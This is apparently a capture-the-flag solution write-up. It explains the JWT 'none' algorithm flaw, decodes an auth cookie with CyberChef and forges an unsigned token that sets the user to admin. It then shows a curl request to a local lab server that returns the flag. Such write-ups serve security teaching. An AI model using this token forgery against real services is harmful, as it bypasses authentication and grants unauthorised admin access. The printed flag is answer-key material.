# Solution

This challenge demonstrates a well known JWT issue where a server can accept a `none` algorithm for the signing of the JWT.

This allows an attacker to decode the JWT and modify the contents of the data section.

In this instance we want to change the value `user` attribute of the encoded JSON data to admin.

We utilise cyberchef for this.

The decoded data obtained from the `auth` cookie is:
```json
{
    "user": "hackymacky",
    "iat": 1599106161
}
```
**[CyberChef Decode Link](https://gchq.github.io/CyberChef/#recipe=JWT_Decode()&input=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5SWpvaWFHRmphM2x0WVdOcmVTSXNJbWxoZENJNk1UVTVPVEV3TmpFMk1YMC50WnhhQVIwbnpGWGtLdlpNMDE2RHFCbThDaFVWUjdrOW92aVd1T01xaFVz)**

Then we reencode the following data using CyberChefs JWT Sign function with the signing algorithm set to none.
This gives us the following output to replace our `auth` cookie with.
Note that the last portion of the JWT, seperated by `.` does not contain any text, because there is no signature.

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1OTkxMDYxNjF9.
```
**[CyberChef Sign Link](https://gchq.github.io/CyberChef/#recipe=JWT_Sign('secret','None')&input=ewogICAgInVzZXIiOiAiYWRtaW4iLAogICAgImlhdCI6IDE1OTkxMDYxNjEKfQ)**

We can then send this back to the server with another get request to `/` with our new `auth` cookie to get the flag.
```bash
curl localhost:3000 -H "Cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1OTkxMDYxNjF9."
<h1>Hello admin! Here is your flag</h1><br><h2>hackmac{no_you_cant_have_my_autograph}</h2>
```